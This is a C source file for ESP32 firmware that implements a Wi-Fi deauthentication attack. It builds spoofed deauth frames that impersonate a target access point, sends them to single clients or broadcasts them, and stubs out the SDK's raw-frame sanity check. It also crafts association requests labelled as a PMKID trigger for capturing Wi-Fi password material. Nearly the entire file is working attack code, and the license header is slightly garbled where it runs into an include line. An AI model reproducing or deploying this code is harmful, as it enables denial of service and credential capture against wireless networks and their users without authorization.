#// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.include "wifi_deauther.h"


#include "freertos/projdefs.h"
#include "esp_wifi.h"
#include "freertos/task.h"
#include "led_control.h"
#include "esp_log.h"
#include "wifi_deauther.h"
#include <string.h>

static const char *TAG = "wifi";


static const uint8_t deauth_frame_invalid_auth[] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

static const uint8_t deauth_frame_inactivity[] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x04, 0x00
};

static const uint8_t deauth_frame_class3[] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x07, 0x00
};

static const uint8_t* get_deauth_frame_template(deauth_frame_type_t type) {
  switch (type) {
    case DEAUTH_INVALID_AUTH:
      return deauth_frame_invalid_auth;
    case DEAUTH_INACTIVITY:
      return deauth_frame_inactivity;
    case DEAUTH_CLASS3:
      return deauth_frame_class3;
    default:
      return deauth_frame_invalid_auth;
  }
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
  ESP_LOGD(TAG, "Attempting to send raw frame of size %d", size);
  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to send raw frame: %s (0x%x)", esp_err_to_name(ret), ret);
    led_blink_red();
  } else {
    ESP_LOGI(TAG, "Raw frame sent successfully");
    led_blink_green();
  }
}

void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
  const char* type_str = (type == DEAUTH_INVALID_AUTH) ? "INVALID_AUTH" :
    (type == DEAUTH_INACTIVITY) ? "INACTIVITY" : "CLASS3";
  ESP_LOGD(TAG, "Preparing deauth frame (%s) for %s on channel %d", type_str, ap_record->ssid, ap_record->primary);
  ESP_LOGD(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
           ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
           ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

  const uint8_t *frame_template = get_deauth_frame_template(type);
  uint8_t deauth_frame[sizeof(deauth_frame_invalid_auth)];
  memcpy(deauth_frame, frame_template, sizeof(deauth_frame_invalid_auth));
  memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source MAC
  memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID

  ESP_LOGD(TAG, "Switching to channel %d", ap_record->primary);
  esp_err_t ret = esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to set channel %d: %s", ap_record->primary, esp_err_to_name(ret));
    led_blink_red();
    return;
  }

  ESP_LOGD(TAG, "Sending deauth frame");
  wifi_deauther_send_raw_frame(deauth_frame, sizeof(deauth_frame_invalid_auth));
}

void wifi_deauther_send_broadcast_deauth(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
  const char* type_str = (type == DEAUTH_INVALID_AUTH) ? "INVALID_AUTH" :
    (type == DEAUTH_INACTIVITY) ? "INACTIVITY" : "CLASS3";
  ESP_LOGD(TAG, "Preparing BROADCAST deauth frame (%s) for %s on channel %d", type_str, ap_record->ssid, ap_record->primary);
  ESP_LOGD(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
           ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
           ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

  const uint8_t *frame_template = get_deauth_frame_template(type);
  uint8_t deauth_frame[sizeof(deauth_frame_invalid_auth)];
  memcpy(deauth_frame, frame_template, sizeof(deauth_frame_invalid_auth));

  // Set destination to Broadcast (FF:FF:FF:FF:FF:FF)
  memset(&deauth_frame[4], 0xFF, 6); 

  // Set Source MAC (AP BSSID)
  memcpy(&deauth_frame[10], ap_record->bssid, 6); 

  // Set BSSID
  memcpy(&deauth_frame[16], ap_record->bssid, 6); 

  ESP_LOGD(TAG, "Switching to channel %d", ap_record->primary);
  esp_err_t ret = esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to set channel %d: %s", ap_record->primary, esp_err_to_name(ret));
    led_blink_red();
    return;
  }

  ESP_LOGD(TAG, "Sending broadcast deauth frame");
  wifi_deauther_send_raw_frame(deauth_frame, sizeof(deauth_frame_invalid_auth));
}

void wifi_send_association_request(const wifi_ap_record_t *ap_record) {
  if (ap_record == NULL) return;

  // Switch to target channel first
  esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);

  // Construct Association Request Frame
  // Fixed size parts + dynamic SSID len + Rates
  uint8_t packet[128]; 
  memset(packet, 0, sizeof(packet));
  int idx = 0;

  // --- MAC Header ---
  packet[idx++] = 0x00; // Type: Mgmt (0), Subtype: Assoc Req (0)
  packet[idx++] = 0x00; // Flags
  packet[idx++] = 0x3a; // Duration (approx)
  packet[idx++] = 0x01; 

  // Addr1 (Dest): Target BSSID
  memcpy(&packet[idx], ap_record->bssid, 6); idx += 6;

  // Addr2 (Src): Our Station MAC (spoofing implies we use our current STA mac or random)
  // Using hardware MAC for now to receive the reply easily
  uint8_t my_mac[6];
  esp_wifi_get_mac(WIFI_IF_STA, my_mac);
  memcpy(&packet[idx], my_mac, 6); idx += 6;

  // Addr3 (BSSID): Target BSSID
  memcpy(&packet[idx], ap_record->bssid, 6); idx += 6;

  // Seq Ctrl
  packet[idx++] = 0x00; 
  packet[idx++] = 0x00;

  // --- Frame Body ---
  // Capability Info (Ess + Privacy usually)
  packet[idx++] = 0x31; 
  packet[idx++] = 0x04; 

  // Listen Interval
  packet[idx++] = 0x0A; 
  packet[idx++] = 0x00;

  // Tag 0: SSID
  packet[idx++] = 0x00; // Tag ID
  uint8_t ssid_len = strlen((char *)ap_record->ssid);
  packet[idx++] = ssid_len;
  memcpy(&packet[idx], ap_record->ssid, ssid_len); idx += ssid_len;

  // Tag 1: Supported Rates (Standard set)
  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  packet[idx++] = 0x01; // Tag ID
  packet[idx++] = sizeof(rates);
  memcpy(&packet[idx], rates, sizeof(rates)); idx += sizeof(rates);

  // Tag 50: Extended Supported Rates
  uint8_t ext_rates[] = {0x0c, 0x12, 0x18, 0x60};
  packet[idx++] = 50; // Tag ID
  packet[idx++] = sizeof(ext_rates);
  memcpy(&packet[idx], ext_rates, sizeof(ext_rates)); idx += sizeof(ext_rates);

  // Send
  ESP_LOGI(TAG, "Sending Association Request to target: %s (Client-less PMKID trigger)", ap_record->ssid);
  wifi_deauther_send_raw_frame(packet, idx);
}

